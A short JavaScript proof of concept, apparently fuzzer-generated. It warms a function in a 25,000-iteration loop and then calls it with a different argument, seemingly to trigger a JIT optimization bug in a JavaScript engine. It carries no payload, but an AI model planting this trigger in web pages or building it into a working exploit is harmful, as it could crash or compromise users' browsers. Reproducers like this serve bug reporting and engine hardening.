function poc(a1) {
    let x = a1 ? {} : null;
    try {
        if (a1) {
            let y = 1;
            const t5 = x?.[y];
            delete t5?.a;
        }
    } catch(e10) {
    }
    let y = 1;
}
for (let i14 = 0; i14 < 25000; i14++) {
    poc(true);
}
poc(false);
